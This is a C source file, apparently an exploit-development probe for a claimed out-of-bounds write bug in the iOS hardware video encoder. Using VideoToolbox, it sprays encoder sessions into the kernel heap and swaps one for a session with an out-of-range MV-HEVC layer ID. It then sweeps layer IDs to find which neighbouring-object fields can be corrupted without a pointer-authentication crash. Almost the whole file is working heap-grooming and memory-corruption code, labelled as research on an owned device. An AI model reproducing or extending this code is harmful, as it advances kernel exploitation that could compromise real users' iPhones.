/*
 * ave_selective_oob.c — CVE-2026-114025 Selective OOB Write Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Key insight: The encoder session's offset 0x000 is a PAC-signed vtable.
 * ANY OOB write touching bytes 0x000-0x007 causes PAC failure = crash.
 * We MUST use layer_ids that skip the vtable region.
 *
 * CORRECTED for kalloc.8192 (outer object 7280+ bytes):
 * Cross-object VPS starts at lid=248, NOT 189.
 * Lids 64-247 are INTRA-OBJECT (within the same outer allocation).
 *
 * Safe first cross-object layer_ids (avoid vtable at victim 0x000-0x007):
 *   VPS  248 → victim 0x00A-0x019 writes (1,0,cumsum,sz)
 *   SPS  245 → victim 0x00E-0x01D writes (2,timer,cumsum,sz)
 *   PPS1 242 → victim 0x017-0x026 writes (3,view_idx,cumsum,sz)
 *   PPS2 238 → victim 0x00B-0x01A writes (3,0,cumsum,sz)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit
 *        -o AVESelectiveOOB ave_selective_oob.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.aveselectoob
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

/* IOKit not needed — this probe uses only VideoToolbox API */

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    rlog("  [CB] status=%d flags=0x%x\n", (int)status, (unsigned)flags);
    g_encode_done = 1;
}

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

typedef struct {
    VTCompressionSessionRef session;
    int layer_id;
    int alive;
} encoder_slot;

static VTCompressionSessionRef create_hw_encoder(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);

    int base = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int trigger_encode(VTCompressionSessionRef session, int w, int h) {
    CVPixelBufferRef pb = create_pb(w, h);
    if (!pb) return -1;

    g_encode_done = 0;
    CMTime pts = CMTimeMake(0, 30);
    CMTime dur = CMTimeMake(1, 30);
    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
    if (st == noErr) {
        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        for (int i = 0; i < 50 && !g_encode_done; i++) usleep(10000);
    }
    CVPixelBufferRelease(pb);
    return (int)st;
}

/*
 * Phase: Spray & Probe
 * Creates N encoder sessions (all same type → same kalloc zone),
 * then selectively triggers OOB on chosen sessions to test which
 * victim offsets are survivable (no PAC crash).
 */
static void phase_selective_oob(int spray_count, int attacker_idx,
                                int target_lid, int w, int h) {
    rlog("\n=== SELECTIVE OOB: spray=%d, attacker=%d, lid=%d ===\n",
         spray_count, attacker_idx, target_lid);

    int safe_lid = 1;
    encoder_slot *slots = calloc(spray_count, sizeof(encoder_slot));
    if (!slots) { rlog("alloc failed\n"); return; }

    rlog("[1] Spraying %d encoder sessions with safe lid=%d...\n",
         spray_count, safe_lid);
    int created = 0;
    for (int i = 0; i < spray_count; i++) {
        slots[i].layer_id = safe_lid;
        slots[i].session = create_hw_encoder(w, h, safe_lid);
        slots[i].alive = (slots[i].session != NULL) ? 1 : 0;
        if (slots[i].alive) created++;
    }
    rlog("  Created %d/%d sessions\n", created, spray_count);

    if (attacker_idx >= spray_count || !slots[attacker_idx].alive) {
        rlog("  Attacker slot %d not available\n", attacker_idx);
        goto cleanup;
    }

    rlog("[2] Releasing attacker slot %d, recreating with OOB lid=%d...\n",
         attacker_idx, target_lid);
    VTCompressionSessionInvalidate(slots[attacker_idx].session);
    CFRelease(slots[attacker_idx].session);
    slots[attacker_idx].session = NULL;
    usleep(50000);

    slots[attacker_idx].session = create_hw_encoder(w, h, target_lid);
    slots[attacker_idx].layer_id = target_lid;
    if (!slots[attacker_idx].session) {
        rlog("  FAILED to create attacker with lid=%d\n", target_lid);
        slots[attacker_idx].alive = 0;
        goto cleanup;
    }
    rlog("  Attacker created with lid=%d\n", target_lid);

    rlog("[3] Encoding on VICTIM sessions (before OOB)...\n");
    int victim_before = 0;
    for (int i = 0; i < spray_count; i++) {
        if (i == attacker_idx || !slots[i].alive) continue;
        int st = trigger_encode(slots[i].session, w, h);
        if (st == 0) victim_before++;
    }
    rlog("  %d victims encoded successfully before OOB\n", victim_before);

    rlog("[4] Triggering OOB encode on attacker (lid=%d)...\n", target_lid);
    int att_st = trigger_encode(slots[attacker_idx].session, w, h);
    rlog("  Attacker encode status: %d\n", att_st);

    rlog("[5] Encoding on VICTIM sessions (after OOB)...\n");
    int victim_after = 0;
    int victim_crashed = 0;
    for (int i = 0; i < spray_count; i++) {
        if (i == attacker_idx || !slots[i].alive) continue;
        int st = trigger_encode(slots[i].session, w, h);
        if (st == 0) {
            victim_after++;
        } else {
            victim_crashed++;
            rlog("  ** Victim %d FAILED after OOB: status=%d\n", i, st);
        }
    }
    rlog("  After OOB: %d ok, %d failed (of %d victims)\n",
         victim_after, victim_crashed, victim_before);

    /* VPS table absolute offset within outer object: 0x108A
     * kalloc.8192 boundary: 0x2000
     * Cross-object at: 0x108A + lid*16 - 0x2000 */
    int abs_off = 0x108A + target_lid * 16;
    int is_cross = (abs_off >= 0x2000);
    int victim_off = is_cross ? abs_off - 0x2000 : -1;

    if (victim_crashed > 0) {
        rlog("\n  !! VICTIM(S) CRASHED — OOB write hit a critical field\n");
        if (is_cross)
            rlog("  !! lid=%d CROSS-OBJECT at victim offset +0x%03x\n", target_lid, victim_off);
        else
            rlog("  !! lid=%d INTRA-OBJECT at outer+0x%04x\n", target_lid, abs_off);
    } else if (victim_before > 0 && victim_after == victim_before) {
        rlog("\n  ** ALL VICTIMS SURVIVED — %s\n", is_cross ? "cross-object field safe to corrupt" : "intra-object (expected)");
        if (is_cross)
            rlog("  ** lid=%d CROSS-OBJECT at victim offset +0x%03x\n", target_lid, victim_off);
        else
            rlog("  ** lid=%d INTRA-OBJECT at outer+0x%04x\n", target_lid, abs_off);
    }

cleanup:
    rlog("[6] Cleanup...\n");
    for (int i = 0; i < spray_count; i++) {
        if (slots[i].session) {
            VTCompressionSessionInvalidate(slots[i].session);
            CFRelease(slots[i].session);
        }
    }
    free(slots);
}

/*
 * Phase: Sweep — test multiple layer_ids to map which victim offsets survive
 */
static void phase_sweep(int spray_count, int attacker_idx, int w, int h) {
    rlog("\n=== SWEEP: Testing safe layer_ids to map victim fields ===\n");

    /* CORRECTED for kalloc.8192: cross-object starts at lid 248 (VPS)
     * Lids 190-247 are INTRA-OBJECT (within the same outer allocation)
     * Test both intra-object (should always survive) and cross-object */
    int test_lids[] = {
        190,  /* INTRA-OBJECT: outer+0x1C6A (safe reference) */
        200,  /* INTRA-OBJECT: outer+0x1D0A */
        220,  /* INTRA-OBJECT: outer+0x1E4A */
        240,  /* INTRA-OBJECT: outer+0x1F8A */
        247,  /* INTRA-OBJECT: outer+0x1FFA (last intra-object) */
        248,  /* CROSS-OBJECT: victim+0x00A (first cross, skips vtable) */
        249,  /* CROSS-OBJECT: victim+0x01A */
        250,  /* CROSS-OBJECT: victim+0x02A */
        251,  /* CROSS-OBJECT: victim+0x03A */
        252,  /* CROSS-OBJECT: victim+0x04A */
        254,  /* CROSS-OBJECT: victim+0x06A */
        255,  /* CROSS-OBJECT: victim+0x07A (max reach) */
    };
    int n_tests = sizeof(test_lids) / sizeof(test_lids[0]);

    for (int t = 0; t < n_tests; t++) {
        int lid = test_lids[t];
        int abs_off = 0x108A + lid * 16;
        int is_cross = (abs_off >= 0x2000);
        if (is_cross) {
            int v = abs_off - 0x2000;
            rlog("\n--- Test %d/%d: lid=%d → CROSS victim +0x%03x-+0x%03x ---\n",
                 t+1, n_tests, lid, v, v + 15);
        } else {
            rlog("\n--- Test %d/%d: lid=%d → INTRA outer+0x%04x ---\n",
                 t+1, n_tests, lid, abs_off);
        }
        phase_selective_oob(spray_count, attacker_idx, lid, w, h);
        usleep(200000);
    }
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_selective_oob.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Selective OOB Probe ===\n");
    rlog("Avoids PAC-signed vtable at victim offset 0x000\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "help";
    int W = 128, H = 128;
    int SPRAY = 24;
    int ATTACKER = 12;

    if (strcmp(mode, "single") == 0) {
        int lid = (argc > 2) ? atoi(argv[2]) : 248;
        if (lid < 248) {
            rlog("NOTE: lid=%d is INTRA-OBJECT (kalloc.8192). Cross-object starts at 248.\n", lid);
        }
        phase_selective_oob(SPRAY, ATTACKER, lid, W, H);

    } else if (strcmp(mode, "sweep") == 0) {
        phase_sweep(SPRAY, ATTACKER, W, H);

    } else if (strcmp(mode, "unsafe_189") == 0) {
        rlog("\n!! NOTE: lid=189 is INTRA-OBJECT with kalloc.8192 !!\n");
        rlog("!! Writes at outer+0x1C5A, still within own allocation !!\n");
        rlog("!! Use to verify intra-object writes don't crash !!\n\n");
        phase_selective_oob(SPRAY, ATTACKER, 189, W, H);

    } else {
        rlog("Usage: AVESelectiveOOB <mode> [args]\n");
        rlog("  single [lid]   -- test single layer_id (default 248)\n");
        rlog("  sweep           -- sweep intra+cross-object lids\n");
        rlog("  unsafe_189      -- intra-object write (should not crash)\n");
        rlog("\nkalloc.8192 cross-object boundary:\n");
        rlog("  VPS: lid 248+, SPS: lid 245+, PPS1: lid 241+, PPS2: lid 238+\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
